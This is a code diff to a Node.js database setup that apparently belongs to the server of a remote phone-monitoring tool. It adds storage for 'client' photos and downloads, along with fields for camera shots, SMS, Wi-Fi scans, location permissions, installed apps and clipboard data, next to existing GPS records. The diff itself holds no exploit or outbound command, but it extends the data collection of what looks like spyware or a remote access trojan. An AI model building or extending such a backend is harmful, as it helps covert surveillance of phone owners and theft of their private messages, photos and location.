@@ -6,10 +6,14 @@ const FileSync = require('lowdb/adapters/FileSync');
 // Setup paths
 const baseDir = path.resolve(__dirname, '../database');
 const clientDir = path.join(baseDir, 'clientData');
+const downloadsDir = path.join(baseDir, 'client_downloads');
+const photosDir = path.join(baseDir, 'client_photos');
 
 // Create folders if missing
 if (!fs.existsSync(baseDir)) fs.mkdirSync(baseDir, { recursive: true });
 if (!fs.existsSync(clientDir)) fs.mkdirSync(clientDir, { recursive: true });
+if (!fs.existsSync(downloadsDir)) fs.mkdirSync(downloadsDir, { recursive: true });
+if (!fs.existsSync(photosDir)) fs.mkdirSync(photosDir, { recursive: true });
 
 // Main DB setup
 const mainDBPath = path.join(baseDir, 'maindb.json');
@@ -56,7 +60,43 @@ class ClientDB {
       GPSData: [],
       GPSSettings: { updateFrequency: 0 },
       downloads: [],
-      currentFolder: []
+      currentFolder: [],
+      availableCameras: [],
+      cameraShots: [],
+      fileStatus: {
+        lastError: null,
+        lastUpdated: null,
+        lastPath: null
+      },
+      smsStatus: {
+        lastError: null,
+        lastUpdated: null,
+        itemCount: 0,
+        truncated: false
+      },
+      wifiStatus: {
+        lastError: null,
+        lastUpdated: null,
+        networkCount: 0,
+        scanRequested: false,
+        lastScanTimestamp: null,
+        locationEnabled: null,
+        hasFineLocation: null,
+        hasCoarseLocation: null
+      },
+      appsStatus: {
+        lastError: null,
+        lastUpdated: null,
+        appCount: 0,
+        includeSystem: null,
+        totalPackages: null,
+        returnedPackages: null,
+        filtered: null
+      },
+      clipboardStatus: {
+        lastUpdated: null,
+        lastError: null
+      }
     }).write();
 
     return db;
